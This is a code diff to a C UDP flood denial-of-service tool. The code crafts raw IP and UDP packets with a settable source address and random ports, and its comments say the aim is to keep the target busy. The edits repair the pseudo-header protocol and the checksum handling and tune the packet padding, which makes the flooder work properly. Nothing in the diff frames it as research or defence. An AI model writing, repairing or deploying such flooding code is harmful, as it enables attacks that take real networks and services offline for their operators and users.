@@ -1,10 +1,9 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <errno.h>
 #include <pthread.h>
-#include <signal.h>
 #include <stdarg.h>
+#include <string.h> // memcpy
 
 #include <unistd.h>
 #include <netinet/ip.h>
@@ -21,7 +20,7 @@ extern void error(const char *fmt, ...);
 
 extern char *randip(char **buff);
 extern int randport(void);
-extern unsigned short checksum(unsigned short *ptr, int hlen);
+extern unsigned short checksum(unsigned short *ptr, int hlen, ...);
 
 static int _send_udp_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep, const int dp)
 {
@@ -29,13 +28,13 @@ static int _send_udp_packet(const char *daddr, const int dport, const char *sadd
     // for UDP padding size
     // make sure the size is very small
     // same traffic will send more packets that make the target busy
-    int padding_size = 1;
+    int padding_size = PADDING_SIZE;
     if (dp)
         // dynamic packet size enable
         // get the random number from [1, 8]
         // The number of bytes is a multiple of 4
         // limited: MTU = 1500
-        padding_size = (2 << (1 + randport() % 8));
+        padding_size = (2 << (1 + randport() % 4));
 
     int socket_fd;
     socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -75,7 +74,7 @@ static int _send_udp_packet(const char *daddr, const int dport, const char *sadd
     iph->ip_sum = 0; // a remplir aprés
     iph->ip_src.s_addr = inet_addr(saddr);
     iph->ip_dst.s_addr = inet_addr(daddr);
-    iph->ip_sum = checksum((unsigned short *)datagram, sizeof(struct ip));
+    iph->ip_sum = checksum((unsigned short *)datagram, sizeof(struct ip), NULL);
 
     // udp header
     udph->uh_sport = htons(sport);
@@ -89,12 +88,12 @@ static int _send_udp_packet(const char *daddr, const int dport, const char *sadd
 
     struct pseudo_header_udp *psh = (struct pseudo_header_udp *)malloc(sizeof(struct pseudo_header_udp));
     psh->source_address = inet_addr(saddr);
-	psh->dest_address = sin.sin_addr.s_addr;
-	psh->placeholder = 0;
-	psh->protocol = IPPROTO_TCP;
-	psh->udp_length = htons(size);
+    psh->dest_address = sin.sin_addr.s_addr;
+    psh->placeholder = 0;
+    psh->protocol = IPPROTO_UDP;
+    psh->udp_length = htons(size);
     memcpy(&psh->udph, udph, sizeof(struct udphdr));
-    udph->uh_sum = checksum((unsigned short *)psh, sizeof(struct pseudo_header_udp));
+    udph->uh_sum = checksum((unsigned short *)psh, sizeof(struct pseudo_header_udp), data);
     free(psh);
 
     int one = 1;
@@ -214,12 +213,3 @@ int udp_flood_attack(char *url, int port, ...)
     }
     return 0;
 }
-
-/*
-int StartUDPFloodTest(const pParameter input)
-{
-    // for test
-    AttackThread(input);
-    return 0;
-}
-*/
